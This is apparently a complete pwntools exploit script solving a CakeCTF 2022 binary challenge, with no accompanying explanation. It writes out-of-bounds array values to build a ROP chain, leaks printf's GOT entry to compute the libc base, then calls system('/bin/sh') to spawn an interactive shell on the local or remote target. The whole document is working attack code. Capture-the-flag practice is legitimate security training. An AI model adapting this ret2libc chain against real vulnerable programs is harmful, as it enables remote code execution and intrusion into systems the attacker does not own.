from pwn import *

sendlineafter = lambda p, x, y: p.sendlineafter(x, y)
sendafter = lambda p, x, y: p.sendafter(x, y)
sendline = lambda p, x: p.sendline(x)
send = lambda p, x: p.send(x)

filepath = './chall'
e = context.binary = ELF(filepath, checksec=False)
context.terminal = 'bash'
if args.REMOTE:
    p = remote('pwn1.2022.cakectf.com', 9002)
    libc = ELF('./libc-2.31.so')
else:
    p = process(filepath)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = [0xe3b2e, 0xe3b31, 0xe3b34]

def dbg(p):
    gdb.attach(p)
    pause()

def func(index, value):
    sendlineafter(p, b'index: ', str(index).encode())
    sendlineafter(p, b'value: ', str(value).encode())

pop_rdi = 0x4013e3

sendlineafter(p, b'size: ', b'5')
func(4, 0x10)
func(0, pop_rdi)
func(1, e.got['printf'])
func(2, e.plt['printf'])
func(3, e.symbols['_start'])
func(6, e.got['exit'])
func(0, pop_rdi)
sendlineafter(p, b'index: ', b'100')
libc.address = u64(p.recvuntil(b'size')[:-4].ljust(8, b'\0')) - libc.symbols['printf']
print(hex(libc.address))

sendlineafter(p, b': ', b'5')
func(4, 0x10)
func(0, pop_rdi)
func(1, next(libc.search(b'/bin/sh')))
func(2, libc.symbols['system'])
sendlineafter(p, b'index: ', b'100')
p.interactive()
